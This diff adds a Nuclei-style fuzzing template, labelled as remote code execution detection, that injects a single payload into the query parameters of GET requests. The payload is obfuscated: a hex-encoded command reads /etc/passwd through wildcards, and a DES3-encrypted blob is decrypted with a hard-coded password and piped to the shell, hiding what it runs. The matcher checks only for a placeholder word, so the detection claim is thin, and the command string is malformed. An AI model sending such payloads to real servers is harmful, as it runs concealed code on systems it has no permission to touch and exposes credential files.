@@ -1,0 +1,39 @@
+id: fuzz-rce-attack
+
+info:
+  name: Remote Code Execution (RCE) Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect potential RCE vulnerabilities using a specified payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce:
+        - "echo '61776b20277b7072696e742024307d27202f3f3f2a632f3f2a7764' | xxd -p -r | sh echo \"U2FsdGVkX19AYgtqPB2JND9fswlDf/i2ZWP8FUTyqHS+7EUuA2meAMm9Cd1Z67lq1+e5qEUyJmBsvFsu5yzI3aftPy8q/qjIwVo8feoh1JM=\" | openssl enc -d -des3 -base64 -pass pass:bex -pbkdf2 | sh | sh"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"  # Placeholder; adjust based on expected output of success
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
